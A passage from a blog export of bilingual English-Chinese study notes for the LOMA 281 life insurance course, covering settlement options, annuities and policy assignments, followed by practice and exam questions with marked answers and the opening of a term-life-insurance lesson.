policyowner chose an irrevocable option, the beneficiary may select a settlement option when the policy proceeds are payable.<br>投保人可以为受益人选择一个结算选项，并可以使该选择可撤销或不可撤销。除非投保人选择了不可撤销的选择权，否则受益人可以在保单收益应付时选择结算选择权。</p><p>The person or party who receives the policy proceeds under a settlement option is the <strong>payee</strong>.<br>根据结算选项接收保单收益的个人或一方为收款人。</p><p><strong>Settlement options</strong>(结算选项)：</p><ul><li>Interest option: The insurer invests proceeds and pays the interest to the payee, typically annually.<ul><li>利息选择：保险公司将收益投资，并定期支付给收款人利息，通常是每年一次。</li></ul></li><li>Fixed-period option: The insurer pays proceeds in equal installments for a specified period.<ul><li>固定期限选择：保险公司按指定期限以相等的分期支付收益。</li></ul></li><li>Fixed-amount option: The insurer pays proceeds in equal installments of a specified amount until policy proceeds and interest are exhausted.<ul><li>固定金额选择：保险公司按指定金额以相等的分期支付收益，直到保单收益和利息耗尽。</li></ul></li><li>Life income option: The insurer pays proceeds in periodic installments over at least the payee’s lifetime.<ul><li>终身收入选择：保险公司按周期分期支付收益，至少在收款人的寿命期间。</li></ul></li></ul><p><strong>Life Annuities</strong>(终身年金):</p><ul><li>Straight life annuity: Periodic benefit payments continue throughout the annuitant’s lifetime and cease at his death.<ul><li>终身年金：周期性的福利支付持续到年金领取人的一生，并在其去世后终止。</li></ul></li><li>Life income annuity with period certain: Guarantees that annuity benefits will be paid throughout the annuitant’s life and for at least a certain period, even if the annuitant dies before the end of that period.<ul><li>带有一定期限的终身年金：保证在年金领取人的一生中以及至少某一特定期限内支付年金福利，即使在该期限结束之前年金领取人去世也会继续支付。</li></ul></li><li>Life income annuity with refund: Provides annuity benefits throughout the annuitant’s lifetime and guarantees that at least the purchase price of the annuity will be paid in benefits.<ul><li>带有退款的终身年金：在年金领取人的一生中提供年金福利，并保证至少支付等同于年金购买价格的福利金额。</li></ul></li><li>Joint and survivor annuity: Provides a series of payments to two or more individuals and those payments continue until both or all of the individuals die.<ul><li>联合和生存年金：向两个或多个个人提供一系列的支付，并且这些支付会持续到所有个体去世为止。</li></ul></li></ul><h2 id="Ownership-Transfers【所有权转让】"><a href="#Ownership-Transfers【所有权转让】" class="headerlink" title="Ownership Transfers【所有权转让】"></a>Ownership Transfers【所有权转让】</h2><p>An assignment is an agreement under which one party (assignor) transfers some or all of his ownership in a particular property to another party (assignee).<br>转让是指一方（转让方）将其在特定财产中的部分或全部所有权转让给另一方（受让方）的协议</p><p>An assignment can’t be made for illegal purposes or infringe on the vested rights of a beneficiary, and the assignor must have contractual capacity.<br>转让不能用于非法目的或侵犯受益人的既得权利，转让人必须具有合同行为能力。</p><hr><p>Two Types of Assignment：</p><ol><li>Absolute assignment: all ownership rights transferred permanently 绝对转让：永久转让所有所有权</li><li>A collateral assignment differs from an absolute assignment in three ways:<br> 2.1 A collateral assignee has a vested right to only the policy’s monetary values. Policyowner retains all other ownership rights. 抵押受让人仅对保单的货币价值拥有无可争议的权利。保单所有人保留所有其他所有权利。<br> 2.2 A collateral assignee’s vested right to the policy’s monetary values is limited to the debt the assignor owes to the assignee. 抵押受让人对保单的货币价值的权利仅限于转让人欠受让人的债务金额。<br> 2.3 A collateral assignee’s rights to policy values are temporary.  抵押受让人对保单价值的权利是暂时的。</li></ol><hr><p>The endorsement method transfers ownership without the policyowner having to enter into a separate assignment agreement.<br>背书方式转移所有权，而无需投保人签订单独的转让协议。</p><ul><li>Commonly used when a policy is given as a gift</li><li>Policyowner notifies insurer in writing of transfer</li></ul><p>A change of ownership provision usually states that the insurer is not responsible for any payments it made to the owner of record before it received written notice of an ownership change and recorded that change.<br>所有权变更条款通常规定，保险公司在收到所有权变更的书面通知并记录该变更之前，不对其向记录所有人支付的任何款项负责。<br>Changing the owner or naming a new successor owner cancels any prior choice of successor owner, but does not change the beneficiary.<br>变更所有人或指定新的继承所有人将取消先前对继承所有人的任何选择，但不会改变受益人。</p><h2 id="课后习题-2"><a href="#课后习题-2" class="headerlink" title="课后习题"></a>课后习题</h2><p>1.Property can be categorized as real property or personal property and as tangible property or intangible property. A life insurance policy is an example of both</p><ul><li>real property and tangible property</li><li>real property and intangible property</li><li>personal property and tangible property</li><li><strong>personal property and intangible property</strong> <blockquote><p>财产可分为不动产或不动产，也可分为有形财产或无形财产。人寿保险单就是两者的一个例子</p><ul><li>不动产和有形财产</li><li>不动产和无形财产</li><li>个人财产和有形财产</li><li>个人财产和无形财产</li></ul></blockquote></li></ul><p>2.Greg Kline was the policyowner of a \$300,000 life insurance policy insuring the life of his wife, Dora. The policy named Pam, Dora’s mother, as primary beneficiary, and Earl, Dora’s brother, as contingent beneficiary. The following statements describe how the policy proceeds of this policy would be paid under different situations. Select the answer choice containing the correct statement.</p><ul><li>When Dora died, Greg, Pam, and Earl had all predeceased her; therefore, the policy proceeds were payable to Dora’s estate.</li><li><strong>When Dora died, Pam and Earl had predeceased her, but Greg was stilliving; therefore, the policy proceeds were payable to Greg.</strong> </li><li>When Dora died, Pam had predeceased her, but Greg and Earl were still living; therefore, the policy proceeds were payable to Greg and Earl, in equal shares.</li><li>When Dora died, Greg had predeceased her, but Pam and Earl were still living; therefore, the policy proceeds were payable to Pam and Earl, in equal shares.<blockquote><p>格雷格·克莱恩是一份价值30万美元的人寿保险单的投保人，为他的妻子多拉的生命投保。保单指定多拉的母亲帕姆为主要受益人，多拉的兄弟厄尔为或有受益人。以下陈述描述了在不同情况下如何支付本保单的保单收益。选择包含正确陈述的答案选项。</p><ul><li>多拉去世时，格雷格、帕姆和厄尔都先于她去世；因此，保单收益应支付给多拉的遗产。</li><li>多拉去世时，帕姆和厄尔已经先于她去世，但格雷格仍然健在；因此，保单收益应支付给格雷格。</li><li>多拉去世时，帕姆已经先于她去世，但格雷格和厄尔还活着；因此，保单收益以同等份额支付给格雷格和厄尔。</li><li>多拉去世时，格雷格先于她去世，但帕姆和厄尔还活着；因此，保单收益以同等份额支付给帕姆和厄尔。</li></ul></blockquote></li></ul><p>3.The following statements are about revocable and irrevocable beneficiary designations for life insurance policies. Select the answer choice containing the correct statement.</p><ul><li>A beneficiary designation is said to be revocable if the policyowner needs the beneficiary’s consent to change the beneficiary designation.</li><li>Most beneficiary designations are irrevocable beneficiaries.</li><li><strong>During the insured’s lifetime, a revocable beneficiary has a “mere expectancy” of receiving the policy proceeds, rather than a vested interest in the proceeds.</strong> </li><li>A policyowner cannot change an irrevocable beneficiary designation if the irrevocable beneficiary dies before the insured.<blockquote><p>以下声明是关于人寿保险单的可撤销和不可撤销受益人指定。选择包含正确陈述的答案选项。</p><ul><li>如果投保人需要受益人的同意才能更改受益人的指定，则称受益人的指定是可撤销的。</li><li>大多数受益人指定是不可撤销的受益人。</li><li>在被保险人的一生中，可撤销受益人“仅仅期望”获得保单收益，而不是收益的既得利益。</li><li>如果不可撤销的受益人在被保险人之前死亡，则投保人不能更改不可撤销受益人的指定。</li></ul></blockquote></li></ul><p>4.The following statement(s) are about the premium payment modes for individual life insurance policies:<br>    A. Insurers typically offer annual, semiannual, quarterly, and monthly premium payment modes.<br>    B. Insurers usually charge less than a prorated portion of the annual premium amount for more frequent premium payment modes.</p><ul><li>Both A and B</li><li><strong>A only</strong> </li><li>B only</li><li>Neither A nor B<blockquote><p>以下声明是关于个人人寿保险单的保费支付模式的：<br>   A.保险公司通常提供年度、半年、季度和月度保费支付模式。<br>   B.对于更频繁的保费支付模式，保险公司通常收取的费用低于年度保费金额的比例。</p><ul><li>A和B</li><li>仅A</li><li>仅限B</li><li>既不是A也不是B</li></ul></blockquote></li></ul><p>5.An Liang, the owner of a participating life insurance policy, has chosen the dividend option under which the insurer will apply policy dividends toward the payment of Mr. Liang’s renewal premiums. This dividend option is known as the</p><ul><li>accumulation at interest dividend option</li><li>paid-up additional insurance dividend option</li><li>cash dividend option</li><li><strong>premium reduction dividend option</strong> <blockquote><p>一份参与人寿保险单的所有人安亮选择了股息选项，根据该选项，保险公司将使用保单股息支付梁先生的续保费。这种股息选择权被称为</p><ul><li>利息分红累积期权</li><li>已缴足的额外保险股息选择权</li><li>现金分红选择权</li><li>保费削减股息选择权</li></ul></blockquote></li></ul><p>6.Ginny Yager is the policyowner-insured of an insurance policy that names her daughter, Beata, as the beneficiary. When Ms. Yager purchased this policy, she selected a type of settlement option under which the insurer will use the policy proceeds to purchase a life annuity for Beata. This annuity will provide benefit payments throughout Beata’s lifetime and will also guarantee that at least the purchase price of the annuity will be paid in benefits. This information indicates that Ms. Yager selected the type of life annuity settlement option known as the</p><ul><li>life income annuity with period certain</li><li>joint and survivor annuity</li><li><strong>life income with refund annuity</strong> </li><li>straight life annuity<blockquote><p>Ginny Yager是一份保险单的投保人，该保险单以她的女儿Beata为受益人。当Yager女士购买这项保单时，她选择了一种结算方式，根据这种方式，保险公司将使用保单收益为Beata购买终身年金。该年金将在Beata的一生中提供福利支付，并保证至少年金的购买价格将以福利形式支付。这些信息表明，Yager女士选择了被称为</p><ul><li>一定期限的终身收入年金</li><li>共同年金和遗属年金</li><li>退还年金的终身收入</li><li>终身年金</li></ul></blockquote></li></ul><p>7.An assignment of a life insurance policy can take one of two forms: an absolute assignment or a collateral assignment. In a collateral assignment, ( **some ** &#x2F; all) of the policyowner’s ownership rights are transferred ( **temporarily ** &#x2F; permanently).</p><blockquote><p>人寿保险单的转让可以采取两种形式之一：绝对转让或附带转让。在抵押品转让中，保单持有人的（部分&#x2F;全部）所有权被转移（暂时&#x2F;永久）。</p></blockquote><h1 id="考试"><a href="#考试" class="headerlink" title="考试"></a>考试</h1><p>1.Individual life insurance policies typically (do not allow &#x2F; <strong>allow</strong>) policyowners to select the premium payment mode, which is the frequency at which renewal premiums are payable. A policy’s premium payment mode usually (<strong>can</strong> &#x2F; cannot) change after the policy is in effect.</p><blockquote><p>个人人寿保险单通常（不允许&#x2F;允许）投保人选择保费支付模式，即支付续期保费的频率。保单的保费支付模式通常（可以&#x2F;不能）在保单生效后发生变化。</p></blockquote><p>2.Lisa Glosser was the policyowner-insured of a $200,000 whole life insurance policy that contained a 31-day grace period provision. Although Ms. Glosser’s renewal premium was due on May 1, she didnot pay it. Two months later, Ms. Glosser died, without having paid the renewal premium. In this situation, the insurer most likely paid the beneficiary of Ms. Glosser’s policy</p><ul><li><p><strong>no benefit of any kind</strong></p></li><li><p>only a refund of the premiums paid</p></li><li><p>$200,000, minus the amount of the unpaid renewal premium</p></li><li><p>$200,000</p></li></ul><blockquote><p>Lisa Glosser是一份价值20万美元的终身保险单的投保人，该保单包含31天的宽限期条款。虽然Glosser女士的续费应于5月1日到期，但她没有支付。两个月后，Glosser先生去世，没有支付续费。在这种情况下，保险公司很可能向Glosser女士保单的受益人付款</p><ul><li>没有任何好处</li><li>只退还已支付的保费</li><li>200000美元，减去未支付的续期保险费</li><li>200000美元</li></ul></blockquote><p>3.Dorothy Jones temporarily assigned the monetary value of her life insurance policy as security for a loan from the Fincastle Bank. In this situation, Ms. Jones made (an absolute &#x2F; <strong>a collateral</strong>)assignment of her life insurance policy. Ms. Jones is the (<strong>assignor</strong> &#x2F; assignee).</p><blockquote><p>Dorothy Jones暂时将她的人寿保险单的货币价值作为Fincastle银行贷款的担保。在这种情况下，Jones女士对她的人寿保险单进行了（绝对&#x2F;抵押品）转让。Jones女士是（转让人&#x2F;受让人）。</p></blockquote><p>4.Bobby Turner is the policyowner-insured of a life insurance policy that will pay him an accelerated death benefit should he have a physician-certified life expectancy of less than 12 months. Thisinformation indicates that Mr. Turner’s policy includes an accelerated death benefit known as</p><ul><li><strong>a terminal illness (TI) benefit</strong></li><li>an accidental death and dismemberment (AD&amp;D) benefit</li><li>a dread disease (DD) benefit</li><li>a critical illness benefit</li></ul><blockquote><p>Bobby Turner是一份人寿保险的投保人，如果他有医生认证的预期寿命低于12个月，该保险将向他支付加速死亡保险金。这些信息表明，特纳先生的保单包括一项被称为</p><ul><li>绝症（TI）福利 </li><li>意外死亡和伤残津贴</li><li>可怕的疾病（DD）益处</li><li>危重症津贴</li></ul></blockquote><p>5.The following statements are about policy dividends and participating life insurance policies. Select the answer choice containing the correct statement.</p><ul><li><strong>Participating policies give policyowners the opportunity to share in the insurer’s divisible surplus.</strong></li><li>Policy dividends are taxable income to policyowners during the year in which they are paid.</li><li>Most insurers guarantee that policy dividends will be paid to policyowners on a quarterly basis.</li><li>If a policyowner has not chosen a policy dividend option, the default option in most participating policies is the premium reduction option.</li></ul><blockquote><p>以下声明是关于保单分红和参与人寿保险的。选择包含正确陈述的答案选项。</p><ul><li>参与保单使投保人有机会分享保险公司的可分割盈余。</li><li>保单红利是保单持有人在支付当年的应纳税所得额。</li><li>大多数保险公司保证每季度向投保人支付保单红利。</li><li>如果投保人没有选择保单分红选项，大多数参与保单的默认选项是保费减免选项。</li></ul></blockquote><p>6.Victor Patrozi was the policyowner-insured of a \$100,000 traditional whole life insurance policy that contained a typical suicide exclusion provision. Three years after Mr. Patrozi purchased his policy,he committed suicide. At the time of Mr. Patrozi’s death, his policy had a cash value of \$7,000. In this situation, the beneficiary of Mr. Patrozi’s policy most likely was entitled to receive</p><ul><li>no benefit of any kind</li><li>only a refund of the policy premiums</li><li><strong>$100,000</strong></li><li>$107,000</li></ul><blockquote><p>Victor Patrozi是一份价值100000美元的传统终身保险单的投保人，该保单包含典型的自杀除外条款。帕特罗齐购买保单三年后自杀。Patrozi先生去世时，他的保单的现金价值为7000美元。在这种情况下，Patrozi先生保单的受益人很可能有权获得 </p><ul><li>没有任何好处 </li><li>只退还保险费</li><li>100000美元</li><li>10.7万美元</li></ul></blockquote><p>7.One true statement about a guaranteed insurability (GI) benefit in a life insurance policy is that this option usually ends at age</p><ul><li>35</li><li><strong>40</strong></li><li>50</li><li>60</li></ul><blockquote><p>关于人寿保险单中保证可保性（GI）福利的一个真实说法是，这种选择通常在年龄结束</p><ul><li>35</li><li>40</li><li>50</li><li>60</li></ul></blockquote><p>8.Susan Luna purchased a \$200,000 whole life insurance policy that allows her to purchase up to 10 coverage units of term life insurance under a spouse and children’s insurance rider. Ms. Luna wishesto purchase term life insurance for her husband, Marcus, and her 12-year-old daughter, Mary. Select the answer choice that correctly identifies the maximum amount of term life insurance coveragethat Ms. Luna most likely can purchase for Marcus and Mary.</p><p>Marcus &#x2F; Mary.</p><ul><li>$10,000  $10,000</li><li><strong>$50,000  $10,000</strong></li><li>$10,000  $50,000</li><li>$50,000  $50,000</li></ul><blockquote><p>Susan Luna购买了一份价值20万美元的终身保险，允许她在配偶和子女保险附加条款下购买最多10个保险单位的定期人寿保险。Luna女士希望为她的丈夫Marcus和她12岁的女儿Mary购买定期人寿保险。选择正确确定Luna女士最有可能为Marcus和Mary购买的定期人寿保险最高金额的答案。</p><p>马库斯&#x2F;玛丽。</p><ul><li>10000美元  10000美元</li><li>50000美元  10000美元</li><li>10000美元  50000美元</li><li>50000美元  50000美元</li></ul></blockquote><p>9.A policyowner usually must satisfy certain conditions before a life insurance policy can be reinstated. The following statements can correctly be made about the conditions necessary for reinstatement:</p><p>​A. The policyowner must complete a reinstatement application.</p><p>​B.The policyowner must provide evidence of insurability.</p><p>​C. For a fixed-premium policy, the policyowner must pay all missed premiums, plus interest.</p><p>​D. The policyowner must either repay any outstanding policy loan or have the loan reinstated with the policy.</p><ul><li><strong>A, B, C,and D</strong></li><li>A, C,and D only</li><li>A and B only</li><li>C and D only</li></ul><blockquote><p>投保人通常必须满足某些条件才能恢复人寿保险。关于恢复所需的条件，可以正确地做出以下陈述：</p><p>a.投保人必须完成恢复申请。</p><p>b.投保人必须提供可保性的证据。</p><p>c.对于固定保费保单，投保人必须支付所有遗漏的保费，外加利息。</p><p>d.投保人必须偿还任何未偿还的保单贷款，或随保单恢复贷款。</p><ul><li><p>A、B、C和D</p></li><li><p>仅限A、C和D</p></li><li><p>仅限A和B</p></li><li><p>仅C和D</p></li></ul></blockquote><p>10.Drew Ringold is the policyowner-insured of a life insurance policy that contains a waiver of premium for disability (WP) benefit. If the definition of disability included in Mr. Ringold’s WP benefit is typical, Mr. Ringold will be considered totally disabled only if he is unable to</p><ul><li><p>perform the duties of any occupation</p></li><li><p>perform the duties of his previous occupation</p></li><li><p><strong>perform the duties of any occupation for which he is reasonably suited by education, training, or experience</strong></p></li><li><p>earn as much money after his disability as he earned prior to the disability</p></li></ul><blockquote><p>Drew Ringold是一份人寿保险单的投保人，该保单包含对残疾保险金（WP）的豁免。如果Ringold先生的WP福利中包含的残疾定义是典型的。林戈尔德只有在不能的情况下才会被视为完全残疾</p><ul><li>履行任何职业的职责</li><li>履行其先前职业的职责</li><li>履行其因教育、培训或经验而合理适合的任何职业的职责</li><li>残疾后的收入与残疾前的收入一样多</li></ul></blockquote><p>11.Consider the following two examples of misrepresentations in life insurance applications:</p><p>​• Sherrie McKay’s application stated that she had a routine physical examination on November 20, when she actually was being treated for hypertension.</p><p>​• Jack Stocker’s application indicated that he had visited his doctor on September 8, when the correct date was September 4.</p><p>In these situations, an insurer most likely would consider that a material misrepresentation was made by</p><ul><li>both Ms. McKay and Mr. Stocker</li><li><strong>Ms. McKay only</strong></li><li>Mr. Stocker only</li><li>neither Ms. McKay nor Mr. Stocker</li></ul><blockquote><p>考虑以下两个人寿保险申请中虚假陈述的例子：</p><p>​•Sherrie McKay的申请称，她在11月20日进行了常规体检，当时她实际上正在接受高血压治疗。</p><p>​•Jack Stocker的申请表明，他于9月8日就诊，而正确的日期是9月4日。</p><p>在这些情况下，保险公司很可能会认为重大虚假陈述是由</p><ul><li>McKay女士和Stocker先生</li><li>仅限McKay女士</li><li>Stocker先生</li><li>McKay女士和Stocker先生都没有</li></ul></blockquote><p>12.Lana Henson is the policyowner-insured of a \$100,000 whole life insurance policy that contains a typical misstatement of age provision. The insurer recently discovered that Ms. Henson stated her ageas 50 on her insurance application, when actually she was 55 at the time of application. Ms. Henson is still alive. In this situation, the insurer most likely will</p><ul><li><p>reduce the policy’s face amount to the amount that the premiums paid would have purchased for a female insured five years older</p></li><li><p>refund Ms. Henson the overpayment of premium caused by the misstatement</p></li><li><p>void the policy on the basis of the misstatement of Ms. Henson’s age</p></li><li><p><strong>charge Ms. Henson the difference between the premiums paid and the premium amount she should have paid had her age been stated correctly on the application</strong></p></li></ul><blockquote><p>Lana Henson是一份价值100000美元的终身保险单的投保人，该保单包含典型的年龄准备金误报。保险公司最近发现，Henson女士在保险申请表上注明了她的年龄为50岁，而申请时她实际上是55岁。亨森女士还活着。在这种情况下，保险公司很可能会</p><ul><li>将保单的票面金额减少到为五岁以上的女性投保人支付的保费金额</li><li>退还Henson女士因错误陈述而多支付的保险费</li><li>基于亨森女士年龄的错误陈述而使保单无效</li><li>向Henson女士收取已支付的保费与她在申请表上正确注明年龄时本应支付的保费金额之间的差额</li></ul></blockquote><p>13.Felicia Martinez, the beneficiary of her father’s life insurance policy, chose to receive the policy proceeds through a life annuity settlement option rather than through a lump-sum payment. When herfather died, Felicia began receiving annual payments from the annuity until her death four years later. After Felicia’s death, her daughter, Clarice, received annual payments from the annuity for sixmore years. This information indicates that Felicia selected a life annuity settlement option known as the</p><ul><li><p>straight life annuity option</p></li><li><p><strong>life income annuity with period certain option</strong></p></li><li><p>life income annuity with refund option</p></li><li><p>fixed-period option</p></li></ul><blockquote><p>Felicia Martinez是她父亲人寿保险单的受益人，她选择通过终身年金结算选项而不是一次性付款来获得保单收益。父亲去世后，Felicia开始每年领取年金，直到四年后去世。费利西亚去世后，她的女儿克拉丽斯（Clarice）又从年金中获得了六年的年度付款。该信息表明Felicia选择了一种称为</p><ul><li>终身年金期权</li><li>具有一定期限选择权的终身收益年金</li><li>可选择退款的终身收入年金</li><li>固定期限期权</li></ul></blockquote><p>14.The following statement(s) can correctly be made about the typical free-look provision included in individual life insurance policies:</p><p>​A. During the free-look period, the insurance coverage is in effect.</p><p>​B. If the policyowner cancels the policy during the free-look period, the policyowner will receive a refund of the initial premium payment.</p><ul><li><strong>Both A and B</strong></li><li>A only</li><li>B only</li><li>Neither A nor B</li></ul><blockquote><p>关于个人人寿保险单中包含的典型免费条款，可以正确地做出以下声明：</p><p>​a.在免费试用期内，保险范围有效。</p><p>​b.如果投保人在免费期内取消保单，投保人将获得初始保费的退款。</p><ul><li>A和B</li><li>仅A</li><li>仅限B</li><li>既不是A也不是B</li></ul></blockquote><p>15.Abigail Cobb purchased a life insurance policy from the Wonderlane Insurance Company, which issues only closed contracts. The transaction involved the following documents:</p><p>​• Document A: The insurance policy</p><p>​• Document B: The attached application for insurance</p><p>​• Document C: An accidental death benefit rider, which is attached to the policy</p><p>The policy contains a typical entire contract provision. This information indicates that, for Ms. Cobb’s policy, the entire contract consists of Document(s)</p><ul><li><strong>A, B,and C</strong></li><li>A and B only</li><li>B and C only</li><li>A only</li></ul><blockquote><p>Abigail Cobb从Wonderlane保险公司购买了一份人寿保险，该公司只签发封闭的合同。该交易涉及以下文件：</p><p>​•文件A：保险单</p><p>​•文件B：随附的保险申请</p><p>​•文件C：意外死亡福利附加条款，附于保单</p><p>该政策包含典型的完整合同条款。这些信息表明，根据Cobb女士的政策，整个合同由文件组成</p><ul><li>A、B和C</li><li>仅限A和B</li><li>仅限B和C</li><li>仅A</li></ul></blockquote><p>16.One type of accelerated death benefit that can be added to a life insurance policy is a long-term care (LTC) insurance benefit. One true statement about a typical LTC insurance benefit is that</p><ul><li>benefits are payable immediately with no waiting period</li><li><strong>benefit payments typically are a percentage of the policy face amount, such as 2%</strong></li><li>benefit payments will continue for as long as the insured needs LTC, even after the full face amount of the policy has been paid out</li><li>the insured must continue to pay the renewal premiums for the life insurance policy while receiving LTC benefit payments</li></ul><blockquote><p>可以添加到人寿保险单中的一种加速死亡福利是长期护理（LTC）保险福利。关于典型的长期护理保险福利，一个真实的说法是</p><ul><li>福利立即支付，无需等待</li><li>福利金通常是保单面值的一个百分比，例如2%</li><li>只要被保险人需要长期护理，即使在全额支付保险单金额后，福利金仍将继续支付</li><li>被保险人在领取长期护理福利金的同时，必须继续支付人寿保险单的续保费</li></ul></blockquote><p>17.The following information describes the deaths of two individuals who were insured by life insurance policies issued by the Hexagon Life Insurance Company:</p><p>​• Winston Lashley died in a war-related accident.</p><p>​• Lilly Fowler died when the boat on which she was riding sank during a storm.</p><p>Both policies contained typical accidental death benefîit riders. Hexagon most likely paid accidental death benefîits for</p><ul><li>both Mr. Lashley’s policy and Ms. Fowler’s policy</li><li>Mr. Lashley’s policy only</li><li><strong>Ms. Fowler’s policy only</strong></li><li>neither Mr. Lashley’s policy nor Ms. Fowler’s policy</li></ul><blockquote><p>以下信息描述了由Hexagon人寿保险公司签发的人寿保险单承保的两名个人的死亡情况：</p><p>​•温斯顿·拉什利死于一场与战争有关的事故。</p><p>​•Lilly Fowler乘坐的船在风暴中沉没，不幸身亡。</p><p>这两项政策都包含典型的意外死亡福利附加条款。Hexagon很可能为意外死亡支付了福利</p><ul><li>拉什利先生和福勒女士的政策</li><li>拉什利先生的政策</li><li>福勒女士的政策</li><li>既不是拉什利先生的政策，也不是福勒女士的政策</li></ul></blockquote><p>18.Vladimir Rushev is the policyowner-insured of a life insurance policy that names his wife, Olga, as the beneficiary. Olga is the type of beneficiary who has a vested interest in the proceeds of Vladimir’spolicy, even while he is alive. Further, Vladimir cannot change the beneficiary designation without Olga’s consent. This information indicates that Olga is the type of beneficiary known as</p><ul><li>a successor beneficiary</li><li><strong>an irrevocable beneficiary</strong></li><li>a first beneficiary</li><li>a revocable beneficiary</li></ul><blockquote><p>Vladimir Rushev是一份人寿保险单的投保人，该保单以他的妻子Olga为受益人。奥尔加是对弗拉迪米尔保单收益拥有既得利益的受益人，即使他还活着。此外，未经奥尔加同意，Vladimir不得更改受益人指定。该信息表明，Olga是被称为</p><ul><li>继承受益人</li><li>不可撤销的受益人</li><li>第一受益人</li><li>可撤销的受益人</li></ul></blockquote><p>19.When Sammy Owens surrendered his cash value life insurance policy, the following values applied to the policy:</p><p>​• \$5,000 for the cash value amount</p><p>​• \$250 in paid-up additions</p><p>​• \$150 in accumulated policy dividends</p><p>​• \$250 in advance premium payments</p><p>​• \$500 for an outstanding policy loan, plus interest</p><p>In this situation, the net cash surrender value payable to Mr. Owens was</p><ul><li>$4,850</li><li><strong>$5,150</strong></li><li>$5,650</li><li>$6,150</li></ul><blockquote><p>Sammy Owens放弃现金价值人寿保险时，以下价值适用于保单：</p><p>​•现金价值为5000美元</p><p>​•250美元的付费附加费</p><p>​•累计保单红利150美元</p><p>​•预付保费250美元</p><p>​•未偿还保单贷款500美元，外加利息</p><p>在这种情况下，应付给Owens先生的现金退保净值为</p><ul><li>4850美元</li><li>5150美元</li><li>5650美元</li><li>6150美元</li></ul></blockquote><p>20.Jim Lerner was the policyowner-insured of a life insurance policy that named his daughters, Krista and Emily, as primary beneficiaries and his wife, Alyssa, as contingent beneficiary. When Jim died, Krista and Alyssa had predeceased him. In this situation, the policy proceeds were payable to</p><ul><li><strong>Emily</strong></li><li>Krista’s estate</li><li>Alyssa’s estate</li><li>Emily, Krista’s estate, and Alyssa’s estate, in equal shares</li></ul><blockquote><p>Jim Lerner是一份人寿保险单的投保人，该保单将他的女儿Krista和Emily列为主要受益人，将他的妻子Alyssa列为或有受益人。当吉姆去世时，克丽斯塔和阿丽莎已经先于他去世。在这种情况下，保单收益应支付给</p><ul><li>Emily</li><li>克里斯塔的遗产</li><li>阿丽莎的庄园</li><li>Emily、Krista的遗产和Alyssa的遗产，按同等份额</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> Loma </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Loma </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Loma 281 Module2</title>
      <link href="/posts/51662/"/>
      <url>/posts/51662/</url>
      
        <content type="html"><![CDATA[<h1 id="Lesson-1"><a href="#Lesson-1" class="headerlink" title="Lesson 1"></a>Lesson 1</h1><h2 id="Term-Life-Insurance【定期人寿保险】"><a href="#Term-Life-Insurance【定期人寿保险】" class="headerlink" title="Term Life Insurance【定期人寿保险】"></a>Term Life Insurance【定期人寿保险】</h2><p>Term Life Insurance: Life insurance that provides a death benefit only if the insured dies during the period specified in the policy.</p><p>Four types of term life insurance:</p><ul><li>Level term life insurance ─ The policy benefit—and usually the premium—remains the same over the term.<ul><li>固定期限寿险：保单保险金（通常也是保费）在整个期限内保持不变。</li></ul></li><li>Decreasing term life insurance ─ The policy benefit decreases over the policy term, but the premium amount usually remains the same.<br>Examples are mortgage insurance, credit life insurance, and family income coverage.<ul><li>递减期限寿险：保单保险金在保单期限内递减，但保费通常保持不变。例如按揭保险、信用人寿保险和家庭收入保障。</li></ul></li><li>Increasing term life insurance ─ The policy benefit increases at stated intervals over the policy term.<br>Premiums increase as the benefit increases.<ul><li>递增期限寿险：保单保险金在保单期限内以规定的间隔递增。随着保险金增加，保费也会增加。</li></ul></li><li>Return of premium (ROP) term life insurance ─ The policy pays a death benefit if the insured dies within the policy term or a return of premiums<br>if the insured lives until the end of the policy term.<ul><li>返还保费期限寿险：如果被保险人在保单期限内去世，保单支付身故保险金；如果被保险人活到保单期限结束，则退还保费。</li></ul></li></ul><h2 id="Other-Term-Insurance-Features【其他定期保险特点】"><a href="#Other-Term-Insurance-Features【其他定期保险特点】" class="headerlink" title="Other Term Insurance Features【其他定期保险特点】"></a>Other Term Insurance Features【其他定期保险特点】</h2><p><strong>Policy renewal：</strong></p><ul><li>Extends existing coverage for another term, usually the same length as original term, but sometimes shorter<ul><li>延长现有保险保障至另一个期限，通常与原始期限相同，但有时较短。</li></ul></li><li>Renewed coverage is usually for same face amount, but it can be for a lesser amount<ul><li>延期的保险保障通常与原始保额相同，但也可以是较低的保额。</li></ul></li><li>Premiums for renewed coverage are based on the insured’s attained age at time of renewal<ul><li>延期保险的保费基于被保险人续期时的实际年龄。</li></ul></li><li>Subject to maximum number of renewals or maximum age limit<ul><li>受到最大续期次数或最大年龄限制的影响。</li></ul></li><li>Does not require evidence of insurability<ul><li>不需要提供可保能力的证明。</li></ul></li></ul><blockquote><p>Renewal coverage can be for the same face amount as the original policy or smaller, but not for a larger face amount. 续保范围可以是与原始保单相同的票面金额或更小，但不能是更大的票面金额。</p><p>Renewal coverage term can be same length as the original policy or shorter, but not longer. 续保期限可以与原保单相同，也可以更短，但不能更长。</p><p>Renewal premium rate is based on the insured’s attained age at renewal and so is higher than original premium rate. 续保费率以被保险人续保时的年龄为基础，因此高于原费率。</p><p>The type of coverage before and after renewal remains the same. 续保前后的保险类型保持不变。</p></blockquote><p><strong>Policy Conversion:</strong></p><ul><li>Allows policyowner to convert term policy to permanent (cash value) coverage during a specified time, known as the conversion period.<ul><li>允许投保人在指定的时间内将定期保单转换为永久（现金价值）保险保障，称为转换期。</li></ul></li><li>Does not require evidence of insurability<ul><li>不需要提供可保能力的证明。</li></ul></li><li>Converted coverage amount can be the same as or less than the original policy’s face amount<ul><li>转换后的保险保障金额可以等同或低于原始保单的保额。</li></ul></li><li>Premiums for converted coverage can be based on the insured’s attained age or original age,<br>The effective date of cash value coverage is the term policy purchase date or the date of conversion.<ul><li>转换后的保费可以基于被保险人的实际年龄或原始年龄计算。现金价值保险的生效日期是定期保单购买日期或转换日期。</li></ul></li></ul><blockquote><p>The insurer may allow conversion for the full amount of, or a percentage of, the original policy. 保险人可以允许转换原保单的全部金额或一定比例。</p><p>The coverage period generally increases because coverage is provided for the insured’s lifetime, not a specified term. 保险期限通常会增加，因为保险是为被保险人的一生提供的，而不是特定的期限。</p><p>The premium rate for a cash value policy is higher than for the original term policy because of the higher cost of lifetime coverage. 现金价值保单的保费率高于原始定期保单，因为终身保险成本更高。</p><p>Conversion involves changing the coverage from temporary coverage to lifetime coverage. 转换涉及将覆盖范围从临时覆盖范围更改为终身覆盖范围。</p></blockquote><h2 